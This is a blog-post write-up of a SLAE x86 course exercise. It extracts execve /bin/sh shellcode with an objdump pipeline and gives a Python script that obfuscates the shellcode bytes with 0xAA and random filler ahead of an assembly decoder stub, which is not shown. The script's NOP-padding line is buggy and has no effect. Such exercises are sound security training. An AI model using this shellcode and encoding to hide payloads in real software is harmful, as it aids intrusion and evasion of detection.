---
title:  "SLAE x86 Assignment 4: Custom Encoding Scheme"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will look at assignment 4 of the SLAE x86 certification. Let's dive right in!

## Understanding The Objective ##
This assignment requires us to write a custom encoding scheme, accompanied with a decoding stub in order for the shellcode to be executed. So this is my take on this assignment:

- First, a python script will be used to encode the shellcode. Each byte of the shellcode will be appended by 0xAA, followed by a random number.
- The decoder will be written in assembly. This decoder stub will contain our encoded shellcode. Once the shellcode has been decoded, execution will be passed to it.

So let's start with the encoder script! We will first need to extract the ```execve-stack``` shellcode:
```
$ objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```python
#SLAE x86 Assignment 4: Custom Encoder Script
#Author: 4p0cryph0n
#Website: https://4p0cryph0n.github.io

#!/usr/bin/python

import sys
import random

execve = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#If length is an odd no. add a nop at the end to make even

if len(bytearray(execve)) % 2 != 0:
	bytearray(execve).append(0x90)

encoded2 = ""

#add 0xaa followed by a random byte after each byte of the shellcode

for x in bytearray(execve):

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % 0xAA + '0x%02x,' % random.randint(1,255)

print encoded2
```
This script will first check whether the length of the shellcode is odd or even, depending upon which it will add a ```NOP``` at the end. This is to help with encoding groups of bytes. Then, the encoding process starts, and is outputted in a format which is supported by nasm. I will manually be adding a byte at the end of this output, which will serve as a marker. This will tell our decoder stub when to stop with the decoding. This byte will be ```\xde```.
